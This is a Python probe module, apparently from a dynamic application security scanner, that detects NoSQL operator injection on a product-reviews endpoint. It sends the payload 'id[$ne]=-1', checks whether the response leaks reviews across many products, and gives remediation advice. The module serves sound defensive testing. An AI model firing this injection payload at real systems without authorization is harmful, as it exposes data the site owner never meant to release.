#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Injection: NoSQL operator-injection on the product-reviews GET.

`GET /rest/products/reviews?id=<id>` should match a single product.
When the framework parses `id[$ne]=-1` as a Mongo query operator
(Express's `qs` parser does this by default), the request becomes
`find({_id: {$ne: -1}})` and returns EVERY review across EVERY
product. The differential is loud — a single-product GET returns
reviews for one productId; the operator-injected form returns
reviews spanning many.

Detection signal:
  GET /rest/products/reviews?id[$ne]=-1 → 200 with a JSON envelope
  whose rows span >1 distinct `product` (or `productId`) value.
"""
from __future__ import annotations

import json
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

REVIEWS_PATH_INJECTED = "/rest/products/reviews?id[$ne]=-1"


class NosqlReviewOperatorInjectionProbe(Probe):
    name = "nosql_review_operator_injection"
    summary = ("Detects NoSQL operator-injection on the reviews GET — "
               "id[$ne]=-1 leaks reviews from every product.")
    safety_class = "read-only"

    def add_args(self, parser):
        pass

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        url = urljoin(origin, REVIEWS_PATH_INJECTED)
        r = client.request("GET", url)
        attempt = {"url": url, "status": r.status, "size": r.size}
        evidence = {"origin": origin, "attempt": attempt}

        if r.status != 200 or not r.body:
            return Verdict(
                validated=False, confidence=0.85,
                summary=(f"Refuted: operator-injected GET on {url} "
                         f"returned status {r.status}."),
                evidence=evidence,
            )
        try:
            doc = json.loads(r.text)
        except json.JSONDecodeError:
            return Verdict(
                validated=False, confidence=0.6,
                summary="Inconclusive: response not JSON.",
                evidence=evidence,
            )
        rows = doc.get("data") if isinstance(doc, dict) else doc
        if not isinstance(rows, list):
            return Verdict(
                validated=False, confidence=0.6,
                summary="Inconclusive: response shape unexpected.",
                evidence=evidence,
            )
        product_ids: set = set()
        for row in rows:
            if isinstance(row, dict):
                pid = row.get("product") or row.get("productId") \
                      or row.get("ProductId")
                if pid is not None:
                    product_ids.add(pid)
        attempt["row_count"]      = len(rows)
        attempt["distinct_pids"]  = len(product_ids)
        attempt["sample_pids"]    = sorted(list(product_ids))[:8]

        if len(product_ids) >= 2:
            return Verdict(
                validated=True, confidence=0.95,
                summary=(f"Confirmed: operator-injection on {url} — "
                         f"response spans {len(product_ids)} distinct "
                         f"product ids ({len(rows)} review rows). The "
                         "$ne operator was honored as a query filter."),
                evidence=evidence,
                severity_uplift="high",
                remediation=(
                    "Disable Express' default `qs` parser flag that "
                    "deep-parses bracket syntax: "
                    "`app.set('query parser', 'simple')`, or coerce "
                    "the id parameter to a primitive before building "
                    "the query. Validate id with a JSON-schema or "
                    "regex BEFORE passing it to the model layer."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: operator-injected GET on {url} "
                     "returned reviews for at most one product id — "
                     "operator was not honored as a filter."),
            evidence=evidence,
        )


if __name__ == "__main__":
    NosqlReviewOperatorInjectionProbe().main()
